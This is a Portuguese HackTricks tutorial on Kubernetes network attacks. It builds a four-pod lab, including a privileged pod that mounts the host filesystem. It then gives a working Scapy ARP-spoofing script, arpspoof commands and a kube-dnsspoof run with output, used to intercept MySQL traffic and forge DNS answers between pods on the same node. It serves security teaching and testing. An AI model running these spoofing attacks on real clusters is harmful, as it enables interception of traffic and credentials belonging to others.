# Ataques de Rede no Kubernetes

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Introdu√ß√£o

No Kubernetes, √© observado que um comportamento padr√£o permite o estabelecimento de conex√µes entre **todos os containers que residem no mesmo n√≥**. Isso ocorre independentemente das distin√ß√µes de namespace. Essa conectividade se estende at√© a **Camada 2** (Ethernet). Consequentemente, essa configura√ß√£o exp√µe potencialmente o sistema a vulnerabilidades. Especificamente, abre a possibilidade para um **container malicioso** executar um **ataque de ARP spoofing** contra outros containers situados no mesmo n√≥. Durante esse tipo de ataque, o container malicioso pode interceptar ou modificar enganosamente o tr√°fego de rede destinado a outros containers.

Os ataques de ARP spoofing envolvem o **atacante enviando mensagens ARP falsificadas** (Protocolo de Resolu√ß√£o de Endere√ßos) em uma rede local. Isso resulta na associa√ß√£o do **endere√ßo MAC do atacante com o endere√ßo IP de um computador ou servidor leg√≠timo na rede**. Ap√≥s a execu√ß√£o bem-sucedida desse tipo de ataque, o atacante pode interceptar, modificar ou at√© mesmo interromper dados em tr√¢nsito. O ataque √© executado na Camada 2 do modelo OSI, raz√£o pela qual a conectividade padr√£o no Kubernetes nessa camada levanta preocupa√ß√µes de seguran√ßa.

No cen√°rio, ser√£o criadas 4 m√°quinas:

* ubuntu-pe: M√°quina privilegiada para escapar para o n√≥ e verificar m√©tricas (n√£o necess√°rio para o ataque)
* **ubuntu-attack**: Container **malicioso** no namespace padr√£o
* **ubuntu-victim**: M√°quina **v√≠tima** no namespace kube-system
* **mysql**: M√°quina **v√≠tima** no namespace padr√£o
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Rede B√°sica do Kubernetes

Se desejar mais detalhes sobre os t√≥picos de rede introduzidos aqui, consulte as refer√™ncias.

### ARP

Em termos gerais, a **rede de pod para pod dentro do n√≥** est√° dispon√≠vel por meio de uma **ponte** que conecta todos os pods. Essa ponte √© chamada de "**cbr0**" (alguns plugins de rede instalar√£o sua pr√≥pria ponte). O **cbr0 tamb√©m pode lidar com a resolu√ß√£o ARP** (Protocolo de Resolu√ß√£o de Endere√ßos). Quando um pacote de entrada chega ao cbr0, ele pode resolver o endere√ßo MAC de destino usando ARP.

Isso implica que, por padr√£o, **cada pod em execu√ß√£o no mesmo n√≥** ser√° capaz de **comunicar-se** com qualquer outro pod no mesmo n√≥ (independentemente do namespace) no n√≠vel Ethernet (camada 2).

{% hint style="warning" %}
Portanto, √© poss√≠vel realizar ataques de **ARP Spoofing entre pods no mesmo n√≥**.
{% endhint %}

### DNS

Em ambientes Kubernetes, voc√™ geralmente encontrar√° 1 (ou mais) **servi√ßos DNS em execu√ß√£o** geralmente no namespace kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
No informa√ß√£o anterior, voc√™ pode ver algo interessante, o **IP do servi√ßo** √© **10.96.0.10** mas o **IP do pod** executando o servi√ßo √© **172.17.0.2.**

Se voc√™ verificar o endere√ßo DNS dentro de qualquer pod, voc√™ encontrar√° algo assim:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
No entanto, o pod **n√£o sabe** como chegar a esse **endere√ßo** porque a **faixa do pod** neste caso √© 172.17.0.10/26.

Portanto, o pod enviar√° as **solicita√ß√µes de DNS para o endere√ßo 10.96.0.10** que ser√° **traduzido** pelo cbr0 **para** **172.17.0.2**.

{% hint style="warning" %}
Isso significa que uma **solicita√ß√£o de DNS** de um pod **sempre** passar√° pela **ponte** para **traduzir** o **IP de servi√ßo para o IP de destino**, mesmo que o servidor DNS esteja na mesma sub-rede que o pod.

Sabendo disso, e sabendo que **ataques ARP s√£o poss√≠veis**, um **pod** em um n√≥ ser√° capaz de **interceptar o tr√°fego** entre **cada pod** na **sub-rede** e a **ponte** e **modificar** as **respostas de DNS** do servidor DNS (**DNS Spoofing**).

Al√©m disso, se o **servidor DNS** estiver no **mesmo n√≥ que o atacante**, o atacante pode **interceptar todas as solicita√ß√µes de DNS** de qualquer pod no cluster (entre o servidor DNS e a ponte) e modificar as respostas.
{% endhint %}

## ARP Spoofing em pods no mesmo N√≥

Nosso objetivo √© **roubar pelo menos a comunica√ß√£o do ubuntu-v√≠tima para o mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Como j√° mencionado, se voc√™ **comprometer um pod no mesmo n√≥ do pod do servidor DNS**, voc√™ pode fazer **MitM** com **ARPSpoofing** na **ponte e no pod DNS** e **modificar todas as respostas DNS**.

Voc√™ tem uma **ferramenta** e um **tutorial** muito bons para testar isso em [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

Em nosso cen√°rio, **baixe** a **ferramenta** no pod do atacante e crie um \*\*arquivo chamado `hosts` \*\* com os **dom√≠nios** que voc√™ deseja **falsificar**, como:
```
cat hosts
google.com. 1.1.1.1
```
Realize o ataque √† m√°quina ubuntu-v√≠tima:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Se voc√™ tentar criar seu pr√≥prio script de DNS spoofing, se voc√™ **apenas modificar a resposta DNS** isso **n√£o** vai **funcionar**, porque a **resposta** ter√° um **IP de origem** o endere√ßo IP do **pod malicioso** e **n√£o** ser√° **aceito**.\
Voc√™ precisa gerar um **novo pacote DNS** com o **IP de origem** do **DNS** para onde a v√≠tima enviou a solicita√ß√£o DNS (algo como 172.16.0.2, n√£o 10.96.0.10, esse √© o IP do servi√ßo de DNS do K8s e n√£o o IP do servidor DNS, mais sobre isso na introdu√ß√£o).
{% endhint %}

## Capturando Tr√°fego

A ferramenta [**Mizu**](https://github.com/up9inc/mizu) √© um visualizador de tr√°fego de API simples, mas poderoso, para Kubernetes, permitindo que voc√™ **visualize toda a comunica√ß√£o da API** entre microsservi√ßos para ajudar na depura√ß√£o e solu√ß√£o de regress√µes.\
Ela instalar√° agentes nos pods selecionados, coletar√° suas informa√ß√µes de tr√°fego e mostrar√° em um servidor web. No entanto, voc√™ precisar√° de permiss√µes elevadas no K8s para isso (e n√£o √© muito furtivo).

## Refer√™ncias

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
